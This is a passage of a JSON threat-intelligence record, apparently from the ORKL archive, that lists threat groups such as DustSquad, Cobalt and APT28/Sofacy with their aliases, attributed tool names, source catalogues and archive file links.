            "main_name": "Nomadic Octopus",
            "aliases": [
                "Nomadic Octopus",
                "DustSquad"
            ],
            "source_name": "MITRE:Nomadic Octopus",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f6fe4b4f-9694-4ffc-94ef-a0cc5aef94d9",
            "created_at": "2022-10-25T16:07:23.556112Z",
            "updated_at": "2025-03-27T02:02:09.86195Z",
            "deleted_at": null,
            "main_name": "DustSquad",
            "aliases": [
                "APT-C-34",
                "DustSquad",
                "Golden Falcon",
                "Nomadic Octopus"
            ],
            "source_name": "ETDA:DustSquad",
            "tools": [
                "Garpun",
                "Paperbug",
                "Remote Control System"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dcba8e2b-93e0-4d6e-a15f-5c44faebc3b1",
            "created_at": "2022-10-25T16:07:23.816991Z",
            "updated_at": "2025-03-27T02:02:09.991944Z",
            "deleted_at": null,
            "main_name": "Lurk",
            "aliases": [],
            "source_name": "ETDA:Lurk",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "70661552-6715-4750-bf4e-527055d3e7b4",
            "created_at": "2023-11-08T02:00:07.114392Z",
            "updated_at": "2025-03-27T02:00:03.184779Z",
            "deleted_at": null,
            "main_name": "DustSquad",
            "aliases": [
                "Nomadic Octopus"
            ],
            "source_name": "MISPGALAXY:DustSquad",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1682906783,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1682341670,
    "ts_modification_date": 1682341670,
    "files": {
        "pdf": "https://archive.orkl.eu/db6501cd0f8af28ed165dff83617ec5d6d372114.pdf",
        "text": "https://archive.orkl.eu/db6501cd0f8af28ed165dff83617ec5d6d372114.txt",
        "img": "https://archive.orkl.eu/db6501cd0f8af28ed165dff83617ec5d6d372114.jpg"
    }
}